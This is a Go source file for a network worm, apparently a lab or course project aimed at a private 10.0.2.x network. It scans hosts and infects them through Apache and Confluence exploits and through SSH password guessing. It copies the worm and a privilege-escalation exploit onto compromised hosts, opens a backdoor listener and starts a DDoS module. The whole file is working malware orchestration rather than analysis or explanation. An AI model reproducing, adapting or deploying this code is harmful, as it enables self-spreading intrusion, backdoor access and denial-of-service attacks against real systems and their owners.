package main

import (
	"sync"
	"fmt"
	"github.com/99graciamanel/mlw/worm/infection"
	"github.com/99graciamanel/mlw/worm/scan"
	"github.com/99graciamanel/mlw/worm/ddos"
	"strconv"
	//"os/exec"
	
	"math/rand"
	"time"
)

func attack(wg *sync.WaitGroup, id int, ip string) {
	attackerString := fmt.Sprintf("Attacker %d: ",id)

	fmt.Println(attackerString + ip)
	ports := scan.ScanIp(ip)
	fmt.Println(ports)
	infected := false
	//Apache infect
	if ports[0] != 0 {
		if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
			infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
			//fmt.Println(infected)
		}
	}
	//Confluence infect
	
	if !infected && ports[2] != 0 {
		ip_port := ip + ":" + strconv.Itoa(ports[2])
		confluenceUrl := "http://" + ip_port
		confluenceEndpoint := "/pages/createpage-entervariables.action?SpaceKey=x"
		if (!infection.ConfluenceCheckInfection(confluenceUrl, confluenceEndpoint)) {
			infected = infection.ConfluenceInfect(confluenceUrl, confluenceEndpoint)
			fmt.Println(infected)
		}
	}
	//SSH infect
	if !infected && ports[1] != 0 {
		ip_port := ip + ":" + strconv.Itoa(ports[1])
		hit_credentials := infection.GuessSSHConnectionV2(ip_port)
		if hit_credentials{
			is_infected := infection.SshCheckInfection(ip_port)
			fmt.Println(is_infected)
			if is_infected {
				return
			}
			message := infection.SshInfect(ip_port, "worm")
			//We don't transfer the users and passwords because we are using the constants
			message = infection.SshInfect(ip_port, "exploit_nss_manual")
			message = infection.SshExploit(ip_port)
			fmt.Println(message)
			infected = true
		}
	}
	wg.Done()
}

func randomNumber(max int) int {
	rand.Seed(time.Now().UnixNano())
	min := 1
	return rand.Intn(max-min+1) + min
}

func main() {
	x := randomNumber(15)
	time.Sleep(time.Duration(x) * time.Second)
		
	go infection.OpenBackdoor("10.0.2.15:8000")
	var wg sync.WaitGroup
	wg.Add(1)
	go ddos.Hello(&wg,"test")

	nAttackers := 6
	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
	var ipList [6]string

	ipList[0] = "10.0.2.14"
	ipList[1] = "10.0.2.12"
	ipList[2] = "10.0.2.13"
	ipList[3] = "10.0.2.15"
	ipList[4] = "10.0.2.11"
	ipList[5] = "10.0.2.8"

	for i := 0; i < nAttackers; i++ {
		ip := scan.GetRandomIp(baseIp[0])
		ip = ipList[i]
		fmt.Println(i)
		wg.Add(1)
		go attack(&wg, i, ip)
		//exec.Command("ping","127.0.0.1").Output()
	}
	wg.Wait()
}
